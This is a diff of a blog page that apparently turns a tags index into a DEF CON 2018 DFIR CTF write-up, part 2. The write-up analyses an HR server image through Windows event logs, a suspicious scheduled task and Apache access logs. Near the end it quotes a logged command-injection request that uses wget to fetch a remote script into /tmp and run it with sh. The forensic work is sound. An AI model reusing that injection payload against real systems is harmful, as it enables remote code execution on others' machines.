@@ -4,26 +4,24 @@
     <meta name="generator" content="Hugo 0.55.5" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tags | 0xbc&#39;s blog</title>
-    <meta name="description" content="Write-ups, notes and rants related to infosec, CTFs, theology, culture, music production and whatever else might be on my mind. Satisfaction guaranteed, or your money back!">
-    <meta name="keywords" content="writeups, ">
+    <title>DEF CON DFIR CTF 2018 Write-up Part 2 - HR Server Advanced and Expert Challenges | 0xbc&#39;s blog</title>
+    <meta name="description" content="A writeup for the 2018 DEF CON DFIR CTF - Part 2">
+    <meta name="keywords" content="linux, dfir">
     
     
     
-    
-      <meta name="robots" content="noindex">
     
     
 
   <meta name="author" content="Ben Cheney">
 
 
-    <meta property="og:title" content="Tags" />
-<meta property="og:description" content="Write-ups, notes and rants related to infosec, CTFs, theology, culture, music production and whatever else might be on my mind. Satisfaction guaranteed, or your money back!" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://0xbc.blog/tags/" />
-
-<meta property="og:updated_time" content="2019-05-08T00:03:40&#43;09:30"/>
+    <meta property="og:title" content="DEF CON DFIR CTF 2018 Write-up Part 2 - HR Server Advanced and Expert Challenges" />
+<meta property="og:description" content="A writeup for the 2018 DEF CON DFIR CTF - Part 2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xbc.blog/post/defcon-dfir-ctf-2018-part-2/" />
+<meta property="article:published_time" content="2019-05-08T00:03:40&#43;09:30"/>
+<meta property="article:modified_time" content="2019-05-08T00:03:40&#43;09:30"/>
 
     
 
@@ -39,9 +37,7 @@
     
     
     
-      <link href="https://0xbc.blog/tags/index.xml" rel="alternate" type="application/rss+xml" title="0xbc&#39;s blog" />
-    
-    <link rel="canonical" href="https://0xbc.blog/tags/">
+    <link rel="canonical" href="https://0xbc.blog/post/defcon-dfir-ctf-2018-part-2/">
     
     
     <link rel="icon" type="image/png" href="/favicon.png"/>
@@ -206,20 +202,219 @@ article [itemprop="description"] {
 
 </header>
     <main>
-  <header>
-    <h1>Tags</h1>
-  </header>
-  <ul>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
     
-      <li><a href="binary-exploitation">binary-exploitation</a> (1)
+<meta itemprop="name" content="DEF CON DFIR CTF 2018 Write-up Part 2 - HR Server Advanced and Expert Challenges">
+<meta itemprop="description" content="A writeup for the 2018 DEF CON DFIR CTF - Part 2">
+
+
+<meta itemprop="datePublished" content="2019-05-08T00:03:40&#43;09:30" />
+<meta itemprop="dateModified" content="2019-05-08T00:03:40&#43;09:30" />
+<meta itemprop="wordCount" content="673">
+
+
+
+<meta itemprop="keywords" content="linux,dfir," />
+
+    <header>
+      <h1 itemprop="headline">DEF CON DFIR CTF 2018 Write-up Part 2 - HR Server Advanced and Expert Challenges</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>4 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2019-05-08T00:03:40&#43;09:30">8 May, 2019</time>
+
+
+      </p>
+    </header>
     
-      <li><a href="bsides-cbr-2017">bsides-cbr-2017</a> (1)
+      <blockquote itemprop="description">A writeup for the 2018 DEF CON DFIR CTF - Part 2</blockquote>
     
-      <li><a href="dfir">dfir</a> (2)
     
-      <li><a href="linux">linux</a> (3)
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#hr-server-advanced-challenges">HR Server - Advanced Challenges</a>
+<ul>
+<li><a href="#logon-event">Logon Event</a></li>
+<li><a href="#task-started">Task Started</a></li>
+<li><a href="#web-app">Web App</a></li>
+<li><a href="#usn-flags">USN Flags</a></li>
+</ul></li>
+<li><a href="#hr-server-expert-challenges">HR Server - Expert Challenges</a>
+<ul>
+<li><a href="#web-traffic">Web Traffic</a></li>
+</ul></li>
+<li><a href="#moar">MOAR</a></li>
+</ul>
+</nav>
+  </details>
+
+
+    <div itemprop="articleBody">
+      <style>
+        pre {
+          white-space: pre-wrap;
+        }
+      </style>
+      
+
+<h1 id="introduction">Introduction</h1>
+
+<p>Following on from my <a href="../defcon-dfir-ctf-2018-part-1">last blog</a>, I turned to the Advanced and Expert level challenges to try and uncover undoubtedly nefarious deeds. Let&rsquo;s go!</p>
+
+<h1 id="hr-server-advanced-challenges">HR Server - Advanced Challenges</h1>
+
+<h2 id="logon-event">Logon Event</h2>
+
+<p>The first question asks you to name the user that logged on at a specific time (given in UTC), as well as the logon type, logon process and IP address. With all our data ingested and ready for searching in Kibana, this was reasonably straightforward. I narrowed the time range down to a couple of seconds around the required timestamp and discovered the following logon event (4624):</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">&lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;
+  &lt;System&gt;
+    &lt;Provider Name=&#34;Microsoft-Windows-Security-Auditing&#34; Guid=&#34;{54849625-5478-4994-A5BA-3E3B0328C30D}&#34;/&gt;
+    &lt;EventID&gt;4624&lt;/EventID&gt;
+    &lt;Version&gt;2&lt;/Version&gt;
+    ...
+    &lt;TimeCreated SystemTime=&#34;2018-07-30T22:31:33.868384100Z&#34;/&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name=&#34;SubjectUserSid&#34;&gt;S-1-5-18&lt;/Data&gt;
+    &lt;Data Name=&#34;SubjectUserName&#34;&gt;WIN-29U41M70JCO$&lt;/Data&gt;
+    &lt;Data Name=&#34;SubjectDomainName&#34;&gt;WORKGROUP&lt;/Data&gt;
+    &lt;Data Name=&#34;SubjectLogonId&#34;&gt;0x00000000000003e7&lt;/Data&gt;
+    &lt;Data Name=&#34;TargetUserSid&#34;&gt;S-1-5-21-2967420476-1305424719-3994513216-1000&lt;/Data&gt;
+    &lt;Data Name=&#34;TargetUserName&#34;&gt;mpowers&lt;/Data&gt;
+    &lt;Data Name=&#34;TargetDomainName&#34;&gt;WIN-29U41M70JCO&lt;/Data&gt;
+    &lt;Data Name=&#34;TargetLogonId&#34;&gt;0x0000000024ba28b7&lt;/Data&gt;
+    &lt;Data Name=&#34;LogonType&#34;&gt;10&lt;/Data&gt;
+    &lt;Data Name=&#34;LogonProcessName&#34;&gt;User32 &lt;/Data&gt;
+    ...
+    &lt;Data Name=&#34;ProcessName&#34;&gt;C:\Windows\System32\svchost.exe&lt;/Data&gt;
+    &lt;Data Name=&#34;IpAddress&#34;&gt;74.118.138.195&lt;/Data&gt;
+    ...
+  &lt;/EventData&gt;
+&lt;/Event&gt;</code></pre></div>
+<p>All the data we need for the answer is here: mpowers - 10 - User32 - 74.118.138.195. LogonType 10 indicates a remote interactive logon&hellip; it&rsquo;s probably fine?</p>
+
+<p>Incidentally, this information came from a <a href="https://en.wikipedia.org/wiki/Shadow_Copy">shadow copy</a> of the security event log. As pointed out in <a href="https://infosecuritygeek.com/defcon-dfir-ctf-2018/#hr-server-advanced">InfoSecurityGeek&rsquo;s walkthrough</a>, the security event log was wiped several days later (event ID 1102). Nefarious deeds indeed.</p>
+
+<h2 id="task-started">Task Started</h2>
+
+<p>Next up: what is the name of the task that was started at blah blah particular UTC timestamp? It&rsquo;s a great question really, and I have no idea. That is, I <em>had</em> no idea until I looked it up in Kibana:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">&lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;
+  &lt;System&gt;
+    &lt;Provider Name=&#34;Microsoft-Windows-TaskScheduler&#34; Guid=&#34;{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}&#34;/&gt;
+    &lt;EventID&gt;100&lt;/EventID&gt;
+    &lt;Version&gt;0&lt;/Version&gt;
+    &lt;Level&gt;4&lt;/Level&gt;
+    &lt;Task&gt;100&lt;/Task&gt;
+    &lt;Opcode&gt;1&lt;/Opcode&gt;
+    &lt;Keywords&gt;0x8000000000000001&lt;/Keywords&gt;
+    &lt;TimeCreated SystemTime=&#34;2018-07-27T02:42:43.948604500Z&#34;/&gt;
+    &lt;EventRecordID&gt;2383&lt;/EventRecordID&gt;
+    &lt;Correlation ActivityID=&#34;{937BB509-B699-4441-B2FE-BB167784D470}&#34;/&gt;
+    &lt;Execution ProcessID=&#34;828&#34; ThreadID=&#34;7568&#34;/&gt;
+    &lt;Channel&gt;Microsoft-Windows-TaskScheduler/Operational&lt;/Channel&gt;
+    &lt;Computer&gt;WIN-29U41M70JCO&lt;/Computer&gt;
+    &lt;Security UserID=&#34;S-1-5-18&#34;/&gt;
+  &lt;/System&gt;
+  &lt;EventData Name=&#34;TaskStartEvent&#34;&gt;
+    &lt;Data Name=&#34;TaskName&#34;&gt;\Throw Taco&lt;/Data&gt;
+    &lt;Data Name=&#34;UserContext&#34;&gt;WIN-29U41M70JCO\mpowers&lt;/Data&gt;
+    &lt;Data Name=&#34;InstanceId&#34;&gt;{937BB509-B699-4441-B2FE-BB167784D470}&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;</code></pre></div>
+<p>As much as I love <a href="http://mexicansociety.com.au/">good tacos</a>, \Throw Taco doesn&rsquo;t sound like a very legit task IMO. We&rsquo;d better keep investigating.</p>
+
+<h2 id="web-app">Web App</h2>
+
+<p>A couple more questions are up next re. the OrangeHRM portal. First one asks which IP address was accessing the web portal with the user agent &ldquo;Chrome 68.0.3440.84&rdquo;? Some grepping of the access logs will suffice here:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text"># grep -a 68.0.3440 /mnt/windows_mount/Program\ Files/OrangeHRM/4.1/apache/logs/access.log | cut -d &#39; &#39; -f1 | uniq
+74.118.139.108</code></pre></div>
+<p>Next, we need to know which version of Apache was being used, which you can find in the changelog (C:\Program Files\OrangeHRM\4.1\apache\CHANGES.txt) - the answer is 2.4.26 (the CTF just requires the answer 2.4).</p>
+
+<h2 id="usn-flags">USN Flags</h2>
+
+<p>To round out the Advanced challenges, we need to give the integer representation for a reason code consisting of three particular flags ORed together. I solved this by just searching my dataset for records that contained the relevant flags (having been parsed out of the USN Journal) and then just read off the value:</p>
+
+<p><img src="/img/defcon-dfir-2018-usn-flags.png" style="width:100%"/></p>
+
+<p>Alternatively, you could <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winioctl/ns-winioctl-usn_record_v2">look up</a> the flag values and calculate the answer that way: 0x80000000 | 0x2 | 0x100 = 0x80000102 = 2147483906.</p>
+
+<h1 id="hr-server-expert-challenges">HR Server - Expert Challenges</h1>
+
+<h2 id="web-traffic">Web Traffic</h2>
+
+<p>There&rsquo;s only two questions in the expert category, and to be honest they&rsquo;re a bit of a doddle. The first question asks you for the top communicating IP address with the web server:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text"># cut -d &#39; &#39; -f1 /mnt/windows_mount/Program\ Files/OrangeHRM/4.1/apache/logs/access.log | uniq -c | sort -n | tail -n 1
+    233 74.118.138.195</code></pre></div>
+<p>Hmmm&hellip; it&rsquo;s the same IP that we saw doing remote logons as the mpowers user.</p>
+
+<p>Finally, we&rsquo;re asked for the number of requests that were made to the web server that contain a wget command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text"># grep -a wget /mnt/windows_mount/Program\ Files/OrangeHRM/4.1/apache/logs/access.log | wc -l
+101</code></pre></div>
+<p>Pretty sketchy stuff there - looks like some kind of attempted RCE shenanigans, as per the following sample log that includes an attempt to run wget:</p>
+
+<pre><code>92.3.30.123 - - [23/Jul/2018:12:26:27 -0700] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Hello, World&quot;
+</code></pre>
+
+<p>And that&rsquo;s it&hellip; we&rsquo;re rewarded for finishing all of the HR Server questions with the password to the next image (tacotunities). On top of that, we&rsquo;re awarded five bonus points. Hurrah! Tune in soon for the next part of the write-up, which will be linked below when it&rsquo;s ready.</p>
+
+<h1 id="moar">MOAR</h1>
+
+<ul>
+<li>DEF CON CTF 2018 Write-up Part 1: <a href="../defcon-dfir-ctf-2018-part-1">HR Server Basic Challenges</a></li>
+</ul>
+
+    </div>
     
-  </ul>
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Ben Cheney</span>
+    
+  
+  <time itemprop="datePublished" datetime="2019-05-08T00:03:40&#43;09:30">
+    8 May, 2019
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/writeups/">writeups</a></span>
+  
+  
+    and tagged <a rel="tag" href="/tags/dfir/">dfir</a> and <a rel="tag" href="/tags/linux/">linux</a>
+  
+  using <span itemprop="wordCount">673</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/defcon-dfir-ctf-2018-part-1/">DEF CON DFIR CTF 2018 Write-up Part 1 - HR Server Basic Challenges</a>
+        <time datetime="6M">6 minutes</time>
+      
+        <li><a href="/post/bsides-cbr-pwn-noob-writeup/">BSides Canberra pwn-noob CTF Write-up</a>
+        <time datetime="8M">8 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
 </main>
     <footer>
   
